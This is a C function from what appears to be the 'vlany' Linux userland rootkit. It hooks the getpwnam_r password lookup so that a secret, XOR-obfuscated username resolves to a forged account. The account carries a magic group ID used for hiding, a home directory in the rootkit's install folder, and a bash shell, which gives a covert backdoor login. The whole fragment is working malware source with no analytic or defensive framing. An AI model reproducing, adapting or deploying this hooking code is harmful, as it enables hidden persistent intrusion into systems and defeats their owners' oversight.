int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    #ifdef PAM_DEBUG
        printf("[vlany] getpwnam_r() called\n");
    #endif

    HOOK(old_getpwnam_r, CGETPWNAM_R);
    
    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);

    if(!strcmp(name, vlany_user))
    {
        char *vlany_perm = strdup(VLANY_PERM); xor(vlany_perm);

        old_getpwnam_r(vlany_perm, pwd, buf, buflen, result);

        pwd->pw_name = strdup(vlany_user);
        pwd->pw_uid = MAGIC_GID;
        pwd->pw_gid = MAGIC_GID;

        char home[64];
        char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
        snprintf(home, sizeof(home), "%s", install_dir);
        CLEAN(install_dir);

        pwd->pw_dir = strdup(home);
        pwd->pw_shell = "/bin/bash";

        CLEAN(vlany_user);
        CLEAN(vlany_perm);
        return 0;
    }
    CLEAN(vlany_user);

    return old_getpwnam_r(name, pwd, buf, buflen, result);
}
